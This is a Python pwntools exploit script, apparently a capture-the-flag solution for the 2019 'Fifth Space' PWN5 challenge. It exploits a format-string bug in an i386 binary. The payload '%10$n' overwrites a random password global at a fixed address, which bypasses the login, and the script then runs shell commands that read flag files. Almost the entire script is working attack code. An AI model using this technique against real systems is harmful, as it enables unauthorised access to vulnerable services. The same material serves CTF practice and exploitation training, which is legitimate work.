from pwn import *
import os
import re
import ssl
import sys
import time

context.arch = "i386"
context.log_level = "info"

BIN = "./[第五空间2019决赛]PWN5"
HOST = os.getenv("HOST", "")
PORT = int(os.getenv("PORT", "9999"))

# Read from /dev/urandom into this global, then compare atoi(pass) with it.
PASSWORD_ADDR = 0x804C044

# printf(name): the name buffer is the 10th variadic argument.
FORMAT_OFFSET = 10


def start():
    if args.LOCAL:
        ld = os.getenv("I386_LD")
        libpath = os.getenv("I386_LIBPATH")
        if ld:
            return process([ld, "--library-path", libpath, BIN])
        return process(BIN)

    if not HOST:
        raise SystemExit(
            "[-] set HOST/PORT, or run: python 08_fifth_space_2019_pwn5_exp.py LOCAL"
        )

    if os.getenv("SSL", "0") == "1":
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        return remote(HOST, PORT, ssl=True, ssl_context=ctx, sni=HOST)

    return remote(HOST, PORT)


def exploit():
    p = start()

    p.recvuntil(b"your name:")

    # 4-byte address + %10$n => writes 4 to 0x804c044.
    # The address bytes contain no NUL, so printf() does not truncate.
    payload = p32(PASSWORD_ADDR) + f"%{FORMAT_OFFSET}$n".encode()
    log.info(f"format payload={payload.hex()} -> {hex(PASSWORD_ADDR)} = 4")
    p.sendline(payload)

    p.recvuntil(b"your passwd:")
    p.sendline(b"4")  # atoi("4") == the 4 we just wrote

    time.sleep(0.2)
    p.sendline(
        b"echo __PWNED__; cat flag* 2>/dev/null; cat /flag* 2>/dev/null; exit"
    )

    out = p.recvall(timeout=10).decode("utf-8", errors="ignore")
    print(out)

    flags = re.findall(r"(?:flag|CTF2|DASCTF)\{[^}]+\}", out, re.I)
    if flags:
        print(f"[+] GOT THE FLAG: {flags[0]}")
    else:
        print("[-] flag not found, raw output above")


if __name__ == "__main__":
    exploit()
